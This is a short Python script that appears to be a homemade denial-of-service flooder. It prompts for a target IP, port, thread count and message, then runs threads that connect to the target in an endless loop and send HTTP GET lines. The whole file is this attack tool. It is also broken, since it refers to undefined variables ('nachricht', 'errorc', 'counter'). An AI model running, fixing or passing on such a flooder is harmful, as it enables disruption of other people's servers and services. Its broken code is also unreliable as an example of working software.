import os
import socket
from threading import Thread
host = input("IP: ")
ip = host
port = int(input("Port: "))
thread = int(input("Threads: "))
usertext = str(input("Message: "))



def dos():
    while True:
        mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            
            mysocket.connect((ip, port))
            mysocket.send(str.encode("GET "+nachricht+"HTTP/1.1\r\n"))
            mysocket.sendto(str.encode("GET "+nachricht+"HTTP/1.1\r\n"), (ip, port))
        except socket.error:
            os.system("cls")# 'clear' für unix!
         
            print("Error: "+str(errorc)+" | Total Threads: "+str(counter)) #todo fix counter displayng
        mysocket.close()
for i in range(thread): 
    t = Thread(target=dos)
    counter = counter+1
    t.start()


